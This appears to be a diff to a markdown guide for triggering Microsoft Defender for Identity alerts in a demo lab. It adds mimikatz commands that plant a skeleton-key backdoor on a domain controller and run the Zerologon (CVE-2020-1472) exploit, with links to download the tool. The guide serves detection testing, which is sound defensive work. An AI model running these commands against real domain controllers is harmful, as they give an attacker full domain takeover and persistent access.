@@ -246,16 +246,34 @@ In this alert, the learned behavior of previous KRB_ERR message encryption from 
 
 From a command line with a shell on DC, run as AD admin :
 
+*mimikatz.exe privilege::debug* 
 *mimikatz # misc::skeleton*  => "mimikatz" should be the master password  
 
 Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
-
 
 Detail in the alert:  
 
 ![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image24.png)  
 
-## 13 - 
+## 13 - Suspected Neltogon privilege elevation attempt (CVE-2020-1472 exploitation)  
+The alert is triggered if an attacker attempts to establishe a vulnerable Netlogon secure channel connection to a DC, using the Netlogon Remote Protocol (MS-NRPC), also known as Netlogon Elevation of Privilege Vulnerability.
+
+From a command line run:  
+
+*mimikatz.exe privilege::debug* 
+*lsadump::zerologon /server:msdemo-DC01.msdemo.local /account:msdemo-DC01$ /exploit*  
+
+Tools available from : https://github.com/gentilkiwi/mimikatz/releases  
+
+Detail in the alert:  
+
+![image1](https://raw.githubusercontent.com/DanielpFR/MDI/Images/Image25.png)  
+
+## 14 - Suspicious network connection over Encrypting File System Remote Protocol
+
+
+
+
 
 
 
